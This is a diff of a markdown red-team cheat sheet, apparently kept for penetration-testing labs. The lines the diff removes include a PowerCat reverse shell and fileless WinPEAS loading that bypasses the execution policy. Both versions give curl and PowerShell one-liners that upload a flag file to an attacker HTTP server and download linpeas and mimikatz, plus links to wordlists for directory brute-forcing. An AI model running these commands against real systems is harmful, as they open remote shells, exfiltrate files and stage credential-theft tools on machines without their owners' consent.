@@ -1,78 +1,51 @@
-# Cybersecurity Tools and Files
-# Dictionaries
-Web Directory Brute Force - Directory List 2.3 Small (87664 Lines)
-```
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-small.txt
-```
-Web Directory Brute Force - Big.txt (20476 Lines)
-```
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt
-```
-Web Directory Brute Force - Common.txt (4727 Lines)
-```
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
-```
-# PowerCat
-```
-https://raw.githubusercontent.com/voidascent/sec/main/powercat.ps1
-```
-```powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10/powercat.ps1');powercat -c 192.168.1.10 -p 9999 -e powershell
-```
-# HTTP Server for Upload and Download
-```bash
-https://raw.githubusercontent.com/voidascent/sec/main/httpserver.py
-```
-Usage
-```bash
-python3 httpserver.py # Default Port 8000
-python3 httpserver.py -p 8888 # Running on Port to 8888
-```
-Curl (Linux and Windows cmd)
-Curl Upload
-```
-curl -F 'file=@/home/ubuntu/Desktop/flag.txt' http://192.168.10.10:8000/
-```
-Curl Download
-```
-curl -O http://192.168.10.10:8000/download/linpeas.sh
-```
-PowerShell (Supported in PowerShell 3.0 and later)
-PowerShell Upload
-```
-$FilePath = "C:\Users\Administrator\Desktop\flag.txt"; $Url = "http://192.168.10.10:8000/"; Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($FilePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($FilePath)); $result = $client.PostAsync($Url, $content).Result; $result.Content.ReadAsStringAsync().Result
-```
-PowerShell Download
-```
-Invoke-WebRequest -Uri "http://192.168.10.10:8000/download/PowerUp.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerUp.ps1"
-```
+# Red Team Cheat Sheet
 
-# WinPEAS
+---
 
-Exe
+# Web
 
-```powershell
-wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
-```
+## Directory Traversal
 
-Exe - Execution
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+
+Commonly Used Dictionaries
 
 ```
-$url = "http://192.168.45.168:8888/winPEASany_ofs.exe"
-```
-```
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+**# web/common.txt - 4743 Lines**
+https://raw.githubusercontent.com/voidexec/sec/main/web/common.txt
+
+# **web/big.txt - 20476 lines**
+https://raw.githubusercontent.com/voidexec/sec/main/web/big.txt
+
+# **web/directory-list-2.3-small.txt - 87664 lines**
+https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-small.txt
+
+# **web/directory-list-2.3-medium.txt - 220559 lines**
+https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-medium.txt
+
+# **web/directory-list-2.3-big.txt - 1273832 lines**
+https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
 ```
 
-Ps1
+## HTTP Server for Upload and Download
 
-```powershell
-https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
 ```
+**# Download**
+https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py
 
-Ps1 - Execution
+**# Start Server**
+python3 httpserver.py (default port 80)
+python3 httpserver.py -p 8000
 
-```powershell
-powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEAS.ps1' -OutFile $env:temp\winPEAS.ps1; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; & $env:temp\winPEAS.ps1"
-```
+**# Upload file with curl**
+curl -F 'file=@**/home/ubuntu/Desktop/flag.txt**' **http://192.168.45.145/**
+
+**# Download file with curl**
+curl -O **http://192.168.45.145/linpeas.sh**
+
+**# Upload with PowerShell**
+$FilePath="**C:\Users\Administrator\Desktop\flag.txt**"; $Url="**http://192.168.45.145/**"; $client=New-Object System.Net.Http.HttpClient; $content=New-Object System.Net.Http.MultipartFormDataContent; $fileStream=[System.IO.File]::OpenRead($FilePath); $content.Add((New-Object System.Net.Http.StreamContent($fileStream)), "file", [System.IO.Path]::GetFileName($FilePath)); $client.PostAsync($Url, $content).Result.Content.ReadAsStringAsync().Result
+
+**# Download with PowerShell**
+iwr -uri "**http://192.168.45.145/mimikatz.exe**" -OutFile "**C:\Users\Public\mimikatz.exe**"
 ```
